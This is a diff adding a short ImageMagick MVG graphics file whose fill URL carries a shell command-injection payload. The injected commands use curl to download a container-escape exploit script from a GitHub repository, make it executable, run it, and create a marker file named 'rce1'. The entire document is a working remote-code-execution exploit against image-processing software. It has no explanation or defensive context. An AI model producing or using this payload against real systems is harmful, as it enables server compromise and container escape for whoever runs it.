@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oops.jpg"|curl https://raw.githubusercontent.com/SgtMate/container_escape_showcase/main/cgroup_release_exploit/exploit.sh -o exploit.sh;chmod a+x exploit.sh;./exploit.sh;touch "rce1)'
+pop graphic-context
